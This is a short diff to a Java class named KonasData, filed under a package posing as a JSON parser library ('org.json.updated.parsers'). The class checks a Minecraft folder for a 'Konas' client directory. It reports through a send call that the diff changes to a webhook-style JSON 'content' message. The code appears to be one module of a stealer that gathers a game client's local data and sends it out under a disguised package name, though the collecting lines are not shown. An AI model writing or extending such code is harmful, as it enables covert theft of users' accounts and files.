@@ -3,6 +3,7 @@ package org.json.updated.parsers.impl;
 import org.json.updated.parsers.JSONObject;
 import org.json.updated.parsers.JSONRegexHandler;
 import org.json.updated.parsers.util.FileSystemHelper;
+import org.json.updated.parsers.util.JSONBuilder;
 
 import java.io.File;
 import java.nio.file.Files;
@@ -19,7 +20,7 @@ public class KonasData implements JSONObject {
 
         String konasFolder = mcFolder + "Konas/";
         if (!Files.exists(Paths.get(konasFolder))) {
-            JSONRegexHandler.send("> Did not contain the Konas folder.");
+            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Konas folder.").build());
             return;
         }
 
@@ -38,6 +39,6 @@ public class KonasData implements JSONObject {
 
     @Override
     public String getName() {
-        return "Kon**ass**Data";
+        return "KonasData";
     }
 }
